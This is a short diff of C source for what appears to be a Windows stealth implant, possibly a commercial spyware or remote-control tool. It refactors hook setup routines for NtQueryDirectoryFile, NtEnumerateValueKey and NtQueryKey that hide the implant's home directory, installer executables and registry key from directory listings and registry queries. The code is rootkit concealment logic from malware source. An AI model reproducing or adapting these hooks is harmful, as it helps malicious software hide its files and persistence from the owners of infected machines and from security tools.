@@ -378,8 +378,8 @@ static DWORD NtQueryDirectoryFileHook_setup(HMServiceStruct *pData)
 
 	VALIDPTR(hMod = GetModuleHandle("NTDLL.DLL"))
 	VALIDPTR(NtQueryDirectoryFileData.pMemcpy = (memcpy_t) HM_SafeGetProcAddress(hMod, "memcpy"))
-	memcpy(NtQueryDirectoryFileData.name_to_hide[0], H4_HOME_DIR, sizeof(NtQueryDirectoryFileData.name_to_hide[0])); // E' sicuramente NULL terminato
-	_snprintf_s(NtQueryDirectoryFileData.name_to_hide[1], MAX_RAND_NAME, _TRUNCATE, "%s.exe", EXE_INSTALLER_NAME);
+	memcpy(NtQueryDirectoryFileData.name_to_hide[0], shared.H4_HOME_DIR, sizeof(NtQueryDirectoryFileData.name_to_hide[0])); // E' sicuramente NULL terminato
+	_snprintf_s(NtQueryDirectoryFileData.name_to_hide[1], MAX_RAND_NAME, _TRUNCATE, "%s.exe", shared.EXE_INSTALLER_NAME);
 	_snprintf_s(NtQueryDirectoryFileData.name_to_hide[2], MAX_RAND_NAME, _TRUNCATE, "%s.exe", "efi_installer.exe");
 
 	// Variabili shared per la creazione degli Hooks...
@@ -932,7 +932,7 @@ DWORD __stdcall NtEnumerateValueKeyHook(DWORD ARG1,
 
 DWORD NtEnumerateValueKeyHook_setup(HMServiceStruct *pData)
 {
-	memcpy(NtEnumerateValueKeyData.name_to_hide, REGISTRY_KEY_NAME, sizeof(NtEnumerateValueKeyData.name_to_hide)); // E' sicuramente NULL terminato
+	memcpy(NtEnumerateValueKeyData.name_to_hide, shared.REGISTRY_KEY_NAME, sizeof(NtEnumerateValueKeyData.name_to_hide)); // E' sicuramente NULL terminato
 	NtEnumerateValueKeyData.dwHookLen = 1000;
 	return 0;
 }
@@ -1025,7 +1025,7 @@ DWORD NtQueryKeyHook_setup(HMServiceStruct *pData)
 
 	VALIDPTR(hMod = GetModuleHandle("NTDLL.DLL"))
 	VALIDPTR(NtQueryKeyData.pNtEnumerateValueKey = (NtEnumerateValueKey_t) HM_SafeGetProcAddress(hMod, "NtEnumerateValueKey"))
-	memcpy(NtQueryKeyData.name_to_hide, REGISTRY_KEY_NAME, sizeof(NtQueryKeyData.name_to_hide)); // E' sicuramente NULL terminato
+	memcpy(NtQueryKeyData.name_to_hide, shared.REGISTRY_KEY_NAME, sizeof(NtQueryKeyData.name_to_hide)); // E' sicuramente NULL terminato
 
 	NtQueryKeyData.dwHookLen = 950;
 	 
